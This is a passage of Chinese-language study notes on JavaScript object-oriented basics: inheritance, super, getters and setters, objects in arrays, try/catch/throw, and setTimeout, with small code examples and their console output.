class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is swimming!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    name=<span class="string">&quot;dog&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is running!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    name=<span class="string">&quot;bird&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">fly</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is flying!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> fish=<span class="keyword">new</span> <span class="title class_">Fish</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fish.<span class="property">alive</span>);</span><br><span class="line">fish.<span class="title function_">eat</span>();</span><br><span class="line">fish.<span class="title function_">sleep</span>();</span><br><span class="line">fish.<span class="title function_">swim</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">fish is eating!</span></span><br><span class="line"><span class="comment">fish is sleeping!</span></span><br><span class="line"><span class="comment">fish is swimming!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> dog=<span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.<span class="title function_">eat</span>();</span><br><span class="line">dog.<span class="title function_">sleep</span>();</span><br><span class="line">dog.<span class="title function_">swim</span>();<span class="comment">//报错</span></span><br><span class="line">dog.<span class="title function_">run</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">dog is eating!</span></span><br><span class="line"><span class="comment">dog is sleeping!</span></span><br><span class="line"><span class="comment">dog.swim is not a function</span></span><br><span class="line"><span class="comment">dog is running!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> bird=<span class="keyword">new</span> <span class="title class_">Bird</span>();</span><br></pre></td></tr></table></figure>

<p><strong>super</strong></p>
<p>用于引用父类构造器的时候</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,runspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">runspeed</span>=runspeed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,swimspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">swimspeed</span>=swimspeed</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog=<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;dog&quot;</span>,<span class="number">15</span>,<span class="number">40</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">runspeed</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Must call super constructor </span></span><br><span class="line"><span class="comment">in derived class before accessing </span></span><br><span class="line"><span class="comment">&#x27;this&#x27; or returning from derived constructor</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>使用super，可以提高代码的重用性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,runspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(name,age);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">runspeed</span>=runspeed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,swimspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">swimspeed</span>=swimspeed</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog=<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;dog&quot;</span>,<span class="number">15</span>,<span class="number">40</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">runspeed</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">dog</span></span><br><span class="line"><span class="comment">15</span></span><br><span class="line"><span class="comment">40</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以这样</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,runspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(); <span class="comment">//加一句这个</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">runspeed</span>=runspeed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>个人理解，就是你一旦在子类中有一个构造函数，那么不管父类有没有构造函数，你这个super()必须要有，它这个设定就是 <strong>优先</strong>确保父类的构造函数先被调用；</p>
<p>当然在实际的代码中，父类是肯定有一个构造函数的，总之有了super，还是提高了代码的重写性，简洁点。</p>
<blockquote>
<p><strong>this和super</strong></p>
<p>super() 从子类中调用父类的构造方法，this() 在同一类内调用其它方法</p>
</blockquote>
<p><strong>get 只读</strong></p>
<p>引入</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">_score</span>);<span class="comment">//60</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">我如果想要让它后面加个单位呢？</span></span><br><span class="line"><span class="comment">也就是说我需要对这个值进行一个处理，当我输入的时候，我直接输出就可以拿到这个处理好的内容</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;p1._score&#125;</span> points`</span>);<span class="comment">//60 points</span></span><br></pre></td></tr></table></figure>

<p>引入get后是这样的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">score</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>._score&#125;</span> points`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br><span class="line">p1.<span class="property">score</span>=<span class="number">1231231123</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br></pre></td></tr></table></figure>

<p>现在的值是<strong>只读</strong>的，如果我想改一个值怎么办，比如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_score</span>=score;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_ok</span>=<span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">score</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>._score&#125;</span> points`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">ok</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>._ok&#125;</span> n`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br><span class="line">p1.<span class="property">ok</span>=<span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">ok</span>);<span class="comment">//12 ok</span></span><br></pre></td></tr></table></figure>

<p><strong>set 修改</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">ok</span>(<span class="params">val</span>)&#123;</span><br><span class="line">        <span class="comment">//其它限制，对该值的修改限制</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          if(val&gt;800)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            val=800</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else if(val&lt;0)&#123;</span></span><br><span class="line"><span class="comment">            val=200</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_ok</span>=val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">60</span>);</span><br><span class="line">p1.<span class="property">score</span>=<span class="number">456</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">score</span>);<span class="comment">//60 points</span></span><br><span class="line">p1.<span class="property">ok</span>=<span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">ok</span>);<span class="comment">//789 n</span></span><br></pre></td></tr></table></figure>

<p>算是为了保护自己的私有属性吧，使用get，set可以保护私有属性的同时，提供外部访问的条件</p>
<p><strong>objects 作为参数</strong></p>
<p>这里已经体现到封装思想了，就是用户使用的时候，只需要调用该方法，知道输出就行，不需要考虑内部细节，且一次调用就实现要求即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yujj&quot;</span>,<span class="number">12</span>,<span class="number">45</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Ygffgh&quot;</span>,<span class="number">23</span>,<span class="number">35</span>);</span><br><span class="line"><span class="comment">//对一个object，我要输出三个属性，就要自己写三个输出</span></span><br><span class="line"><span class="comment">//那我封装一个</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">show</span>(p1);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">p</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">name</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">age</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">score</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Yujj</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">45</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//修改也可以</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">change</span>(p1,<span class="string">&quot;12312321&quot;</span>);</span><br><span class="line"><span class="title function_">show</span>(p1);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change</span>(<span class="params">p,val</span>)&#123;</span><br><span class="line">    p.<span class="property">age</span>=val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Yujj</span></span><br><span class="line"><span class="comment">12312321</span></span><br><span class="line"><span class="comment">45</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>数组和对象</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,score</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">score</span>=score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yujj&quot;</span>,<span class="number">12</span>,<span class="number">45</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;gffgh&quot;</span>,<span class="number">23</span>,<span class="number">35</span>);</span><br><span class="line"><span class="keyword">const</span> ps=[p1,p2];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ps[<span class="number">0</span>].<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ps[<span class="number">1</span>].<span class="property">name</span>);</span><br><span class="line">ps[<span class="number">0</span>].<span class="title function_">eat</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Yujj</span></span><br><span class="line"><span class="comment">gffgh</span></span><br><span class="line"><span class="comment">Yujj is eating!</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>匿名对象</strong></p>
<p>不需要想名字啦</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params">name,score</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">score</span>=score;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// const p1=new Person(&quot;asda&quot;,123);</span></span><br><span class="line"><span class="comment">// const p2=new Person(&quot;sqwe&quot;,465);</span></span><br><span class="line"><span class="comment">// const p3=new Person(&quot;xzc&quot;,789);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ps=[</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;asda&quot;</span>,<span class="number">123</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sqwe&quot;</span>,<span class="number">465</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;xzc&quot;</span>,<span class="number">789</span>)</span><br><span class="line">]</span><br><span class="line">ps.<span class="title function_">forEach</span>(<span class="function">(<span class="params">p</span>)=&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;p.name&#125;</span>,<span class="subst">$&#123;p.score&#125;</span>`</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">asda,123</span></span><br><span class="line"><span class="comment">sqwe,465</span></span><br><span class="line"><span class="comment">xzc,789</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// ps.forEach(print);</span></span><br><span class="line"><span class="comment">// print(ps[0]);</span></span><br><span class="line"><span class="comment">// function print(p)&#123;</span></span><br><span class="line"><span class="comment">//  //console.log(`$&#123;p.name&#125;,$&#123;p.score&#125;`);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>捕获异常</strong></p>
<p><strong>try…catch</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">lag</span>();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error.<span class="property">message</span>);</span><br><span class="line">    <span class="comment">//console.lag is not a function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>try…throw…catch</strong></p>
<p>手动抛出一个异常</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> x=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;Enter #&quot;</span>);</span><br><span class="line">    x=<span class="title class_">Number</span>(x);</span><br><span class="line">    <span class="comment">//弹窗内容是非数字时</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(x)) <span class="keyword">throw</span> <span class="string">&quot;this is NaN,not number&quot;</span>;</span><br><span class="line">    <span class="comment">//弹窗内容是空时</span></span><br><span class="line">    <span class="keyword">if</span>(x==<span class="string">&quot;&quot;</span>) <span class="keyword">throw</span> <span class="string">&quot;this is empty,not number&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">   </span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>setTimeout()</strong></p>
<p>浏览器在一个指定的等候时间去执行指定代码</p>
<p>每一次刷新，它都会<strong>循环</strong>执行代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hobby=<span class="string">&quot;篮球&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> price=<span class="number">100.99</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行的方法，和等候时间</span></span><br><span class="line"><span class="built_in">setTimeout</span>(firstmess,<span class="number">3000</span>,hobby,price);</span><br><span class="line"><span class="built_in">setTimeout</span>(secondmess,<span class="number">5000</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(thirdmess,<span class="number">9000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">firstmess</span>(<span class="params">hobby,price</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`the <span class="subst">$&#123;hobby&#125;</span> is $<span class="subst">$&#123;price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">secondmess</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`this is $100`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">thirdmess</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`the final`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>**clearTimeout() **</p>
<p>指定一个id，取消该 setTimeout() 所设定的定时执行，不会影响其它id的setTimeout() </p>
